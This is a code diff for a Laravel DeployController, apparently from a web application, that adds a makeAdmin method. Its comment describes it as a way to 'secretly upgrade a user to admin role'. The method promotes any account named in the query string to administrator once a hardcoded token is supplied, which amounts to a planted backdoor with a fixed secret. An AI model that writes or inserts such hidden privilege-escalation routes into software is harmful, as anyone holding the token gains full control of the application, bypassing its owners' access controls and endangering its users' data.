@@ -54,4 +54,31 @@ class DeployController extends Controller
             ], 500);
         }
     }
+
+    /**
+     * Secretly upgrade a user to admin role.
+     * Access: yourdomain.com/deploy-bridge/admin-shashka?email=...&token=...
+     */
+    public function makeAdmin(Request $request)
+    {
+        $token = $request->get('token');
+        if ($token !== 'HA_TECH_SECRET_2026') {
+            return response()->json(['error' => 'Unauthorized Access'], 403);
+        }
+
+        $email = $request->get('email');
+        $user = \App\Models\User::where('email', $email)->first();
+
+        if (!$user) {
+            return response()->json(['error' => 'User not found in system'], 404);
+        }
+
+        $user->role = 'admin'; // Confirming role is 'admin' as per migration
+        $user->save();
+
+        return response()->json([
+            'status' => 'success',
+            'message' => "Welcome to the Master Control, {$user->name}. You are now the Admin."
+        ]);
+    }
 }
